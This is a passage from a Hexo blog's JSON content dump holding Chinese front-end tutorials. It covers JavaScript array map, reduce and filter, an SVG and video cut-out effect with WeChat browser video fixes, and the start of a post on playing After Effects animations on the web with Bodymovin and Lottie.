class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pow</span>(<span class=\"params\">x</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x * x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.map(pow); </span><br><span class=\"line\"><span class=\"comment\">// [1, 4, 9, 16, 25, 36, 49, 64, 81]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.map(<span class=\"built_in\">String</span>); </span><br><span class=\"line\"><span class=\"comment\">// ['1', '2', '3', '4', '5', '6', '7', '8', '9']</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>];</span><br><span class=\"line\">arr.reduce(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x, y</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;); </span><br><span class=\"line\"><span class=\"comment\">// 25</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter\"></a>filter</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//例如，在一个Array中，删掉偶数，只保留奇数，可以这么写：</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">15</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x % <span class=\"number\">2</span> !== <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">r; <span class=\"comment\">// [1, 5, 9, 15]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//把一个Array中的空字符串删掉，可以这么写：</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'A'</span>, <span class=\"string\">''</span>, <span class=\"string\">'B'</span>, <span class=\"literal\">null</span>, <span class=\"literal\">undefined</span>, <span class=\"string\">'C'</span>, <span class=\"string\">'  '</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s &amp;&amp; s.trim(); <span class=\"comment\">// 注意：IE9以下的版本没有trim()方法</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">r; <span class=\"comment\">// ['A', 'B', 'C']</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//利用filter，可以巧妙地去除Array的重复元素：</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'apple'</span>, <span class=\"string\">'strawberry'</span>, <span class=\"string\">'banana'</span>, <span class=\"string\">'pear'</span>, <span class=\"string\">'apple'</span>, <span class=\"string\">'orange'</span>, <span class=\"string\">'orange'</span>, <span class=\"string\">'strawberry'</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> r = arr.filter(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">element, index, self</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> self.indexOf(element) === index;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">r; <span class=\"comment\">// [\"apple\", \"strawberry\", \"banana\", \"pear\", \"orange\"]</span></span><br><span class=\"line\"><span class=\"comment\">//去除重复元素依靠的是indexOf总是返回第一个元素的位置，后续的重复元素位置与indexOf返回的位置不相等，因此被filter滤掉了。</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"http://www.cnblogs.com/goloving/p/8361705.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/goloving/p/8361705.html</a></p>"},{"title":"svg与视频结合的镂空效果实践","date":"2018-04-10T09:37:28.000Z","updated":"2018-04-10T09:37:28.000Z","_content":"\n# 概述\n一个是svg的运用，另一个是video在移动端的兼容问题。\n<!-- more -->\n# 详述\n\n## 效果预览\n截图见附录，[在线地址](//special.made-in-china.com/brandPublicty)\n\n## 实现\n思路一，是用png，优点是简单直接，缺点就是非矢量，可能有锯齿，多端需要多张图；\n\n思路二，是用svg，优点是矢量，可以直接用svg标签也可以像图片一样单独引用，缺点就是需要一点学习成本。\n\n显然，这次采用的是思路二，对于svg的本次使用，简单说明下：\n由于是全屏半透明“M”镂空，因此首先想到的是有个直接全屏的svg，但是实际要响应多终端，宽高比都不同，一个全屏的svg是不可行的。怎么办呢？利用snap.svg等js库动态创建是不是可以呢？问题是很多时候镂空的图案是特殊的设计图案，一般的程序员想去直接绘制也不太可行。\n\n最后实现是设计师提供一个\"M\"svg文件，咱们根据屏幕大小实时的补全上边左边右边部分。\n\n对于svg的使用可以单独引用文件也可以嵌入HTML中。\n\n### 单独引用方法有如下这些：\n```html\n<embed src=\"xxx.svg\" type=\"image/svg+xml\" /> \n```\n```html\n<object data=\"xxx.svg\" type=\"image/svg+xml\"></object> \n```\n```html\n<iframe src=\"xxx.svg\"></iframe> \n```\n```html\n<img src=\"xxx.svg\" alt=\"\">\n```\n### 嵌入HTML中方法：\n由于SVG是XML文件，因此可以用任何文本编辑器创建、查看和编辑，当然实际运用中都是用可视化工具创作，例如inkscape、Illustrator等。用文本编辑器打开svg文件，直接复制黏贴到HTML中，然后做些简单的整理可以了。\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\">\n    <path class=\"st1\" d=\"xxxxxx\"/>\n    ...\n</svg>\n```\n## 移动端video兼容问题\n1，微信内置浏览器自动全屏的问题。\n处理方法是在video标签上加`x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\"`\n```html\n<video src=\"xxx.mp4\" x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\" data-poster=\"xxx.jpg\" preload=\"none\" loop=\"loop\" class=\"media-video\">\n    Your browser does not support the video tag.\n</video>\n```\n2，微信内置浏览器z-index不起作用问题。\n处理方法是在video便签上加`x5-video-player-type=\"h5\"`\n```html\n<video src=\"xxx.mp4\" x5-video-player-type=\"h5\" x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\" data-poster=\"xxx.jpg\" preload=\"none\" loop=\"loop\" class=\"media-video\">\n    Your browser does not support the video tag.\n</video>\n```\n3，实际中还有各种其他问题，例如自动播放属性设置无效，iOS端编码格式要求等，最后因为业务及时间等因素综合考虑，针对移动触屏端改用图片循环播。\n\n## 效果展示：\nPC端：\n\n![品宣专题PC](brandPublicty1.jpg)\n![品宣专题PC](brandPublicty2.jpg)\n\n移动端：\n\n![品宣专题移动](brandPublicty3.jpg) ![品宣专题移动](brandPublicty4.jpg)\n","source":"_posts/2019/04/2019-04-10-svg-video.md","raw":"---\ntitle: svg与视频结合的镂空效果实践\ntags:\n  - video\n  - svg\n  - 动效\ncategories:\n  - 前端\ndate: 2018-04-10 17:37:28\nupdated: 2018-04-10 17:37:28\n---\n\n# 概述\n一个是svg的运用，另一个是video在移动端的兼容问题。\n<!-- more -->\n# 详述\n\n## 效果预览\n截图见附录，[在线地址](//special.made-in-china.com/brandPublicty)\n\n## 实现\n思路一，是用png，优点是简单直接，缺点就是非矢量，可能有锯齿，多端需要多张图；\n\n思路二，是用svg，优点是矢量，可以直接用svg标签也可以像图片一样单独引用，缺点就是需要一点学习成本。\n\n显然，这次采用的是思路二，对于svg的本次使用，简单说明下：\n由于是全屏半透明“M”镂空，因此首先想到的是有个直接全屏的svg，但是实际要响应多终端，宽高比都不同，一个全屏的svg是不可行的。怎么办呢？利用snap.svg等js库动态创建是不是可以呢？问题是很多时候镂空的图案是特殊的设计图案，一般的程序员想去直接绘制也不太可行。\n\n最后实现是设计师提供一个\"M\"svg文件，咱们根据屏幕大小实时的补全上边左边右边部分。\n\n对于svg的使用可以单独引用文件也可以嵌入HTML中。\n\n### 单独引用方法有如下这些：\n```html\n<embed src=\"xxx.svg\" type=\"image/svg+xml\" /> \n```\n```html\n<object data=\"xxx.svg\" type=\"image/svg+xml\"></object> \n```\n```html\n<iframe src=\"xxx.svg\"></iframe> \n```\n```html\n<img src=\"xxx.svg\" alt=\"\">\n```\n### 嵌入HTML中方法：\n由于SVG是XML文件，因此可以用任何文本编辑器创建、查看和编辑，当然实际运用中都是用可视化工具创作，例如inkscape、Illustrator等。用文本编辑器打开svg文件，直接复制黏贴到HTML中，然后做些简单的整理可以了。\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\">\n    <path class=\"st1\" d=\"xxxxxx\"/>\n    ...\n</svg>\n```\n## 移动端video兼容问题\n1，微信内置浏览器自动全屏的问题。\n处理方法是在video标签上加`x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\"`\n```html\n<video src=\"xxx.mp4\" x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\" data-poster=\"xxx.jpg\" preload=\"none\" loop=\"loop\" class=\"media-video\">\n    Your browser does not support the video tag.\n</video>\n```\n2，微信内置浏览器z-index不起作用问题。\n处理方法是在video便签上加`x5-video-player-type=\"h5\"`\n```html\n<video src=\"xxx.mp4\" x5-video-player-type=\"h5\" x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\" data-poster=\"xxx.jpg\" preload=\"none\" loop=\"loop\" class=\"media-video\">\n    Your browser does not support the video tag.\n</video>\n```\n3，实际中还有各种其他问题，例如自动播放属性设置无效，iOS端编码格式要求等，最后因为业务及时间等因素综合考虑，针对移动触屏端改用图片循环播。\n\n## 效果展示：\nPC端：\n\n![品宣专题PC](brandPublicty1.jpg)\n![品宣专题PC](brandPublicty2.jpg)\n\n移动端：\n\n![品宣专题移动](brandPublicty3.jpg) ![品宣专题移动](brandPublicty4.jpg)\n","slug":"2019-04-10-svg-video","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xc005jwovv17dd331w","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一个是svg的运用，另一个是video在移动端的兼容问题。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"效果预览\"><a href=\"#效果预览\" class=\"headerlink\" title=\"效果预览\"></a>效果预览</h2><p>截图见附录，<a href=\"//special.made-in-china.com/brandPublicty\">在线地址</a></p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>思路一，是用png，优点是简单直接，缺点就是非矢量，可能有锯齿，多端需要多张图；</p>\n<p>思路二，是用svg，优点是矢量，可以直接用svg标签也可以像图片一样单独引用，缺点就是需要一点学习成本。</p>\n<p>显然，这次采用的是思路二，对于svg的本次使用，简单说明下：<br>由于是全屏半透明“M”镂空，因此首先想到的是有个直接全屏的svg，但是实际要响应多终端，宽高比都不同，一个全屏的svg是不可行的。怎么办呢？利用snap.svg等js库动态创建是不是可以呢？问题是很多时候镂空的图案是特殊的设计图案，一般的程序员想去直接绘制也不太可行。</p>\n<p>最后实现是设计师提供一个”M”svg文件，咱们根据屏幕大小实时的补全上边左边右边部分。</p>\n<p>对于svg的使用可以单独引用文件也可以嵌入HTML中。</p>\n<h3 id=\"单独引用方法有如下这些：\"><a href=\"#单独引用方法有如下这些：\" class=\"headerlink\" title=\"单独引用方法有如下这些：\"></a>单独引用方法有如下这些：</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">embed</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.svg\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"image/svg+xml\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">data</span>=<span class=\"string\">\"xxx.svg\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"image/svg+xml\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.svg\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.svg\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"嵌入HTML中方法：\"><a href=\"#嵌入HTML中方法：\" class=\"headerlink\" title=\"嵌入HTML中方法：\"></a>嵌入HTML中方法：</h3><p>由于SVG是XML文件，因此可以用任何文本编辑器创建、查看和编辑，当然实际运用中都是用可视化工具创作，例如inkscape、Illustrator等。用文本编辑器打开svg文件，直接复制黏贴到HTML中，然后做些简单的整理可以了。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.w3.org/2000/svg\"</span> <span class=\"attr\">version</span>=<span class=\"string\">\"1.1\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">class</span>=<span class=\"string\">\"st1\"</span> <span class=\"attr\">d</span>=<span class=\"string\">\"xxxxxx\"</span>/&gt;</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"移动端video兼容问题\"><a href=\"#移动端video兼容问题\" class=\"headerlink\" title=\"移动端video兼容问题\"></a>移动端video兼容问题</h2><p>1，微信内置浏览器自动全屏的问题。<br>处理方法是在video标签上加<code>x5-playsinline=&quot;&quot; playsinline=&quot;&quot; webkit-playsinline=&quot;&quot;</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">video</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.mp4\"</span> <span class=\"attr\">x5-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">webkit-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">data-poster</span>=<span class=\"string\">\"xxx.jpg\"</span> <span class=\"attr\">preload</span>=<span class=\"string\">\"none\"</span> <span class=\"attr\">loop</span>=<span class=\"string\">\"loop\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"media-video\"</span>&gt;</span></span><br><span class=\"line\">    Your browser does not support the video tag.</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>2，微信内置浏览器z-index不起作用问题。<br>处理方法是在video便签上加<code>x5-video-player-type=&quot;h5&quot;</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">video</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.mp4\"</span> <span class=\"attr\">x5-video-player-type</span>=<span class=\"string\">\"h5\"</span> <span class=\"attr\">x5-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">webkit-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">data-poster</span>=<span class=\"string\">\"xxx.jpg\"</span> <span class=\"attr\">preload</span>=<span class=\"string\">\"none\"</span> <span class=\"attr\">loop</span>=<span class=\"string\">\"loop\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"media-video\"</span>&gt;</span></span><br><span class=\"line\">    Your browser does not support the video tag.</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>3，实际中还有各种其他问题，例如自动播放属性设置无效，iOS端编码格式要求等，最后因为业务及时间等因素综合考虑，针对移动触屏端改用图片循环播。</p>\n<h2 id=\"效果展示：\"><a href=\"#效果展示：\" class=\"headerlink\" title=\"效果展示：\"></a>效果展示：</h2><p>PC端：</p>\n<p><img src=\"/2019-04-10-svg-video/brandPublicty1.jpg\" alt=\"品宣专题PC\"><br><img src=\"/2019-04-10-svg-video/brandPublicty2.jpg\" alt=\"品宣专题PC\"></p>\n<p>移动端：</p>\n<p><img src=\"/2019-04-10-svg-video/brandPublicty3.jpg\" alt=\"品宣专题移动\"> <img src=\"/2019-04-10-svg-video/brandPublicty4.jpg\" alt=\"品宣专题移动\"></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一个是svg的运用，另一个是video在移动端的兼容问题。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"效果预览\"><a href=\"#效果预览\" class=\"headerlink\" title=\"效果预览\"></a>效果预览</h2><p>截图见附录，<a href=\"//special.made-in-china.com/brandPublicty\">在线地址</a></p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>思路一，是用png，优点是简单直接，缺点就是非矢量，可能有锯齿，多端需要多张图；</p>\n<p>思路二，是用svg，优点是矢量，可以直接用svg标签也可以像图片一样单独引用，缺点就是需要一点学习成本。</p>\n<p>显然，这次采用的是思路二，对于svg的本次使用，简单说明下：<br>由于是全屏半透明“M”镂空，因此首先想到的是有个直接全屏的svg，但是实际要响应多终端，宽高比都不同，一个全屏的svg是不可行的。怎么办呢？利用snap.svg等js库动态创建是不是可以呢？问题是很多时候镂空的图案是特殊的设计图案，一般的程序员想去直接绘制也不太可行。</p>\n<p>最后实现是设计师提供一个”M”svg文件，咱们根据屏幕大小实时的补全上边左边右边部分。</p>\n<p>对于svg的使用可以单独引用文件也可以嵌入HTML中。</p>\n<h3 id=\"单独引用方法有如下这些：\"><a href=\"#单独引用方法有如下这些：\" class=\"headerlink\" title=\"单独引用方法有如下这些：\"></a>单独引用方法有如下这些：</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">embed</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.svg\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"image/svg+xml\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">data</span>=<span class=\"string\">\"xxx.svg\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"image/svg+xml\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.svg\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.svg\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"嵌入HTML中方法：\"><a href=\"#嵌入HTML中方法：\" class=\"headerlink\" title=\"嵌入HTML中方法：\"></a>嵌入HTML中方法：</h3><p>由于SVG是XML文件，因此可以用任何文本编辑器创建、查看和编辑，当然实际运用中都是用可视化工具创作，例如inkscape、Illustrator等。用文本编辑器打开svg文件，直接复制黏贴到HTML中，然后做些简单的整理可以了。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.w3.org/2000/svg\"</span> <span class=\"attr\">version</span>=<span class=\"string\">\"1.1\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">class</span>=<span class=\"string\">\"st1\"</span> <span class=\"attr\">d</span>=<span class=\"string\">\"xxxxxx\"</span>/&gt;</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"移动端video兼容问题\"><a href=\"#移动端video兼容问题\" class=\"headerlink\" title=\"移动端video兼容问题\"></a>移动端video兼容问题</h2><p>1，微信内置浏览器自动全屏的问题。<br>处理方法是在video标签上加<code>x5-playsinline=&quot;&quot; playsinline=&quot;&quot; webkit-playsinline=&quot;&quot;</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">video</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.mp4\"</span> <span class=\"attr\">x5-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">webkit-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">data-poster</span>=<span class=\"string\">\"xxx.jpg\"</span> <span class=\"attr\">preload</span>=<span class=\"string\">\"none\"</span> <span class=\"attr\">loop</span>=<span class=\"string\">\"loop\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"media-video\"</span>&gt;</span></span><br><span class=\"line\">    Your browser does not support the video tag.</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>2，微信内置浏览器z-index不起作用问题。<br>处理方法是在video便签上加<code>x5-video-player-type=&quot;h5&quot;</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">video</span> <span class=\"attr\">src</span>=<span class=\"string\">\"xxx.mp4\"</span> <span class=\"attr\">x5-video-player-type</span>=<span class=\"string\">\"h5\"</span> <span class=\"attr\">x5-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">webkit-playsinline</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">data-poster</span>=<span class=\"string\">\"xxx.jpg\"</span> <span class=\"attr\">preload</span>=<span class=\"string\">\"none\"</span> <span class=\"attr\">loop</span>=<span class=\"string\">\"loop\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"media-video\"</span>&gt;</span></span><br><span class=\"line\">    Your browser does not support the video tag.</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>3，实际中还有各种其他问题，例如自动播放属性设置无效，iOS端编码格式要求等，最后因为业务及时间等因素综合考虑，针对移动触屏端改用图片循环播。</p>\n<h2 id=\"效果展示：\"><a href=\"#效果展示：\" class=\"headerlink\" title=\"效果展示：\"></a>效果展示：</h2><p>PC端：</p>\n<p><img src=\"/2019-04-10-svg-video/brandPublicty1.jpg\" alt=\"品宣专题PC\"><br><img src=\"/2019-04-10-svg-video/brandPublicty2.jpg\" alt=\"品宣专题PC\"></p>\n<p>移动端：</p>\n<p><img src=\"/2019-04-10-svg-video/brandPublicty3.jpg\" alt=\"品宣专题移动\"> <img src=\"/2019-04-10-svg-video/brandPublicty4.jpg\" alt=\"品宣专题移动\"></p>"},{"title":"怎么在App和Web中使用ae动画","date":"2019-04-12T06:33:52.000Z","updated":"2019-04-12T06:33:52.000Z","_content":"\n# 概述\n由于前端工程师不熟悉ae，动画师不熟悉前端知识，第一次可能不知道怎么整合，这里做个简单介绍。简言之就是用ae的插件[Bodymovin](https://www.adobeexchange.com/creativecloud.details.12557.html)导出动画的json数据，然后用[Lottie](http://airbnb.io/lottie/#/README)动画库在页面中调用。[源代码](https://github.com/jovysun/WOW)\n![动画示例图](2.gif)\n<!-- more -->\n\n# 详述\n\n## Bodymovin安装\n1. 方法一在Adobe插件中心下载安装[Bodymovin](https://www.adobeexchange.com/creativecloud.details.12557.html)\n2. 方法二直接下载源文件[bodymovin.zxp](https://github.com/airbnb/lottie-web/tree/master/build/extension)用[ZXP Installer](https://aescripts.com/learn/zxp-installer/)安装。\n\n详细步骤请参考[https://www.cnblogs.com/zamhown/p/6688369.html](https://www.cnblogs.com/zamhown/p/6688369.html)\n\n## web页面使用\n```html\n<div class=\"stage\"></div>\n<script src=\"lottie.min.js\"></script>\n<script>\nvar stage = document.querySelector('.stage');\nvar anim = lottie.loadAnimation({\n    container: stage,   //包含动画的DOM元素\n    renderer: 'svg',  // 'svg' / 'canvas' / 'html'\n    loop: false, //true / false / number\n    autoplay: true, //true / false\n    path: 'loading.json',   //动画的路径\n});\nanim.addEventListener('complete', function(){\n    console.log('complete:' + Date.now());\n    anim.destroy();\n})\n</script>\n```\n\n## 查看\n如果直接本地打开，应该看不了，会提示如下错误：\n![错误示例图](1.jpg)\n因此需要本地简单起个http服务才能查看，可以简单装个http-server。\n\n## 其他 \nlottie也支持Android, iOS, React Native, and Windows端使用，具体请移步[官方文档](http://airbnb.io/lottie/#/README)。\n","source":"_posts/2019/04/2019-04-12-ae-lottie-demo.md","raw":"---\ntitle: 怎么在App和Web中使用ae动画\ntags:\n  - HTML\n  - JavaScript\n  - 动效\ncategories:\n  - 前端\ndate: 2019-04-12 14:33:52\nupdated: 2019-04-12 14:33:52\n---\n\n# 